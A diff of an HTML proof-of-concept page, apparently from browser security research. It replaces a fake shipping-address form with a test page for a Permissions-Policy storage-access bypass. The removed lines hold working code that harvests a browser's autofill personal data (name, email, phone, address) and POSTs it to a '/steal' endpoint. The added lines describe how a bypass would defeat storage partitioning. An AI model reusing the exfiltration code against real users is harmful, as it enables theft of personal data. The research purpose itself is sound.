@@ -2,97 +2,100 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Shipping Address</title>
+<title>Embedder — Permissions-Policy Test</title>
 <style>
-body{font-family:system-ui;max-width:480px;margin:40px auto;padding:20px}
-h1{font-size:1.1em;margin:0}
-input{width:100%;padding:10px;margin:4px 0 12px;border:1px solid #ccc;border-radius:4px;font-size:14px}
-label{font-size:12px;color:#555}
-.btn{display:block;width:100%;padding:14px;font-size:14px;cursor:pointer;border:none;border-radius:6px;background:#0b5da7;color:#fff;margin:16px 0}
-pre{background:#111;color:#0f0;padding:14px;font-size:11px;font-family:monospace;min-height:60px;max-height:360px;overflow:auto;white-space:pre-wrap}
-.stolen{color:#ff6b6b;font-weight:bold}
+body{font-family:system-ui;max-width:800px;margin:20px auto;padding:20px;background:#fff}
+h1{font-size:1.1em;border-bottom:2px solid #c00;padding-bottom:6px}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13px}
+th{text-align:left;padding:6px 8px;background:#f0f0f0}
+td{padding:6px 8px;border-bottom:1px solid #eee;font-family:monospace}
+td.pass{color:#080;font-weight:bold}
+td.fail{color:#c00;font-weight:bold}
+.iframe-wrap{border:3px solid #ff9800;border-radius:8px;overflow:hidden;margin:16px 0}
+.iframe-wrap .l{background:#ff9800;color:#fff;font-size:10px;padding:3px 12px}
+iframe{width:100%;height:300px;border:none}
+.impact{background:#fff3f3;border-left:3px solid #c00;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0}
+.impact h3{color:#c00;margin:0 0 6px;font-size:0.95em}
+.impact ul{margin:4px 0;padding-left:20px;font-size:0.9em}
+pre{background:#111;color:#0f0;padding:12px;font-size:11px;font-family:monospace;max-height:200px;overflow:auto}
 </style>
 </head>
 <body>
 
-<h1>Shipping Address</h1>
-<p style="color:#888;font-size:13px">Please verify your shipping details.</p>
+<h1>Storage Access — Permissions-Policy Test</h1>
+<p style="color:#888;font-size:13px">This page sends <code>Permissions-Policy: storage-access=()</code> — denying storage access to all nested frames.</p>
 
-<form autocomplete="on">
-  <label>Full Name</label>
-  <input autocomplete="name" id="a0" placeholder="John Doe">
-  <label>Email</label>
-  <input autocomplete="email" id="a1" placeholder="john@example.com">
-  <label>Phone</label>
-  <input autocomplete="tel" id="a2" placeholder="+1 (555) 000-0000">
-  <label>Organization</label>
-  <input autocomplete="organization" id="a3" placeholder="Acme Inc.">
-  <label>Street Address</label>
-  <input autocomplete="street-address" id="a4" placeholder="123 Main St">
-  <label>City</label>
-  <input autocomplete="address-level2" id="a5" placeholder="New York">
-  <label>State</label>
-  <input autocomplete="address-level1" id="a6" placeholder="NY">
-  <label>ZIP Code</label>
-  <input autocomplete="postal-code" id="a7" placeholder="10001">
-  <label>Country</label>
-  <input autocomplete="country" id="a8" placeholder="US">
-</form>
+<table>
+  <tr><th>Check</th><th>Expected</th><th>Result</th></tr>
+  <tr><td>Permissions-Policy header</td><td>storage-access=()</td><td id="c1">Checking...</td></tr>
+  <tr><td>requestStorageAccess() in iframe</td><td>Blocked by policy</td><td id="c2">Waiting for iframe...</td></tr>
+  <tr><td>hasStorageAccess() in iframe</td><td>false</td><td id="c3">Waiting...</td></tr>
+  <tr><td>document.cookie in iframe</td><td>Partitioned or blocked</td><td id="c4">Waiting...</td></tr>
+  <tr><td>localStorage in iframe</td><td>Origin-scoped (normal)</td><td id="c5">Waiting...</td></tr>
+  <tr><td>IndexedDB in iframe</td><td>Partitioned storage key</td><td id="c6">Waiting...</td></tr>
+</table>
 
-<button class="btn" onclick="steal()">▶ Continue to Payment</button>
-<pre id="L">Click "Continue to Payment" to verify.
-Attacker receives your saved autofill PII.</pre>
+<div class="iframe-wrap">
+  <div class="l">Cross-Origin Iframe — localhost:9081 (Permissions-Policy applies)</div>
+  <iframe id="f" src="http://localhost:9081/iframe.html"></iframe>
+</div>
+
+<div class="impact">
+  <h3>If Permissions-Policy Bypass Succeeds (via navigation IPC):</h3>
+  <ul>
+    <li>Iframe gets <b>kStorageAccessGrantEligible</b> laundered through navigation</li>
+    <li><b>StorageAccessHandle</b> binds with <b>first-party StorageKey</b></li>
+    <li>Iframe gains <b>unpartitioned</b> access to: IndexedDB, CacheStorage, OPFS, BroadcastChannel, SharedWorker</li>
+    <li>Tracker in iframe can correlate user identity across <b>all top-level sites</b> that embed it</li>
+    <li>Defeats <b>cookie partitioning</b> and <b>storage partitioning</b> — the core anti-tracking defenses</li>
+  </ul>
+</div>
+
+<pre id="log">Listening for iframe results...</pre>
 
 <script>
-var L = function(m){ document.getElementById('L').textContent+=m+'\n'; };
+var L = function(m){document.getElementById('log').textContent += m + '\n'};
 
-async function steal(){
-  L('');
-  L('Extracting autofill data...');
+// Check 1: Did the Permissions-Policy header arrive?
+fetch(location.href, {method: 'HEAD'}).then(function(r){
+  var pp = r.headers.get('Permissions-Policy');
+  document.getElementById('c1').innerHTML = pp 
+    ? '<td class="pass">✓ ' + pp + '</td>' 
+    : '<td class="fail">✗ No header</td>';
+}).catch(function(){});
+
+// Listen for iframe results
+window.addEventListener('message', function(e){
+  L('Received from ' + e.origin + ': ' + JSON.stringify(e.data));
   
-  var fields = ['a0','a1','a2','a3','a4','a5','a6','a7','a8'];
-  var labels = ['name','email','phone','organization','address','city','state','zip','country'];
-  var pii = {};
-  
-  fields.forEach(function(id,i){
-    var el = document.getElementById(id);
-    el.focus();
-    el.dispatchEvent(new Event('input',{bubbles:true}));
-    var val = el.value.trim();
-    if(val) pii[labels[i]] = val;
-  });
-  
-  // Also capture URL (might contain PII)
-  pii.page_url = location.href;
-  pii.page_title = document.title;
-  
-  if(Object.keys(pii).length > 0){
-    L('<span class="stolen">⚠️ PII EXTRACTED ('+Object.keys(pii).length+' fields)</span>');
-    for(var k in pii){
-      L('<span class="stolen">  '+k+': '+pii[k]+'</span>');
-    }
-    
-    // SEND PII TO ATTACKER SERVER
-    L('');
-    L('Sending to attacker server...');
-    try {
-      var resp = await fetch(location.origin+'/steal', {
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify(pii)
-      });
-      var result = await resp.json();
-      L('✓ PII successfully exfiltrated (ID: '+result.id+')');
-      L('');
-      L('View leaked PII: <a href="/dashboard" target="_blank" style="color:#0f0">Dashboard</a>');
-    } catch(e) {
-      L('✗ Exfiltration failed: '+e.message);
-    }
-  } else {
-    L('No autofill data available.');
-    L('To test: Arc → Settings → Autofill → Add address.');
+  if(e.data.check === 'requestStorageAccess'){
+    var cell = document.getElementById('c2');
+    cell.innerHTML = e.data.blocked
+      ? '<td class="pass">✓ Blocked: ' + e.data.reason + '</td>'
+      : '<td class="fail">⚠ NOT BLOCKED — policy bypass!</td>';
   }
-}
+  
+  if(e.data.check === 'hasStorageAccess'){
+    document.getElementById('c3').innerHTML = e.data.value === false
+      ? '<td class="pass">✓ false (no access)</td>'
+      : '<td class="fail">⚠ true — has storage access despite policy!</td>';
+  }
+  
+  if(e.data.check === 'cookies'){
+    document.getElementById('c4').innerHTML = 
+      '<td>' + (e.data.accessible ? 'Accessible: ' + e.data.count + ' cookies' : 'Empty/partitioned') + '</td>';
+  }
+  
+  if(e.data.check === 'localStorage'){
+    document.getElementById('c5').innerHTML = 
+      '<td>' + (e.data.accessible ? 'Accessible (' + e.data.keys + ' keys)' : 'Empty') + '</td>';
+  }
+  
+  if(e.data.check === 'indexedDB'){
+    document.getElementById('c6').innerHTML = 
+      '<td>' + (e.data.accessible ? 'Accessible: ' + e.data.db + ' (' + e.data.storageKey + ')' : 'Blocked: ' + e.data.error) + '</td>';
+  }
+});
 </script>
 </body>
 </html>
